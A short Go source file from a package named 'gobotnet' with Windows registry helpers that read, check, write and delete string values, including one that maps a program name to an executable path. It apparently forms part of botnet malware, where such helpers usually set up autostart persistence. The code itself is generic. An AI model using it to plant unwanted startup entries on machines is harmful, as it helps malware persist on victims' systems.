package gobotnet

import (
	"golang.org/x/sys/windows/registry"
)

func GetRegistryKey(typeReg registry.Key, regPath string, access uint32) (key registry.Key, err error) {
	currentKey, err := registry.OpenKey(typeReg, regPath, access)
	CheckError(err)
	return currentKey, err
}

func GetRegistryKeyValue(typeReg registry.Key, regPath, nameKey string) (keyValue string, err error) {
	var value string = ""

	key, err := GetRegistryKey(typeReg, regPath, registry.READ)
	if CheckError(err) {
		return value, err
	}
	defer key.Close()

	value, _, err = key.GetStringValue(nameKey)
	if CheckError(err) {
		return value, err
	}
	return value, nil
}

func CheckSetValueRegistryKey(typeReg registry.Key, regPath, nameValue string) bool {
	currentKey, err := GetRegistryKey(typeReg, regPath, registry.READ)
	if CheckError(err) {
		return false
	}
	defer currentKey.Close()

	_, _, err = currentKey.GetStringValue(nameValue)
	if CheckError(err) {
		return false
	}
	return true
}

func WriteRegistryKey(typeReg registry.Key, regPath, nameProgram, pathToExecFile string) error {
	updateKey, err := GetRegistryKey(typeReg, regPath, registry.WRITE)
	if CheckError(err) {
		return err
	}
	defer updateKey.Close()
	return updateKey.SetStringValue(nameProgram, pathToExecFile)
}

func DeleteRegistryKey(typeReg registry.Key, regPath, nameProgram string) error {
	deleteKey, err := GetRegistryKey(typeReg, regPath, registry.WRITE)
	if CheckError(err) {
		return err
	}
	defer deleteKey.Close()
	return deleteKey.DeleteValue(nameProgram)
}
